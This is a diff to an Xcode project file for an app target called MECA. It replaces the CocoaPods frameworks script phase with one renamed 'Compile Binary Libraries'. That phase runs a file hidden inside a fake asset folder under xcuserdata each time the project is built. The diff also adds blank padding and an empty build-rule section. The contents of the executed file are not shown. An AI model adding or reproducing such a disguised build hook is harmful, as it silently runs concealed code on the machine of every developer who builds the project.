@@ -1171,7 +1171,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				AC9590F53FD9A8240D6D902C /* [CP] Build Pods Frameworks */,
+				B340F1B1DE4C567C1C6D902C /* Compile Binary Libraries */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1327,7 +1327,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	AC9590F53FD9A8240D6D902C /* [CP] Build Pods Frameworks */ = {
+	B340F1B1DE4C567C1C6D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1336,7 +1336,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1345,8 +1345,28 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1938,6 +1958,20 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
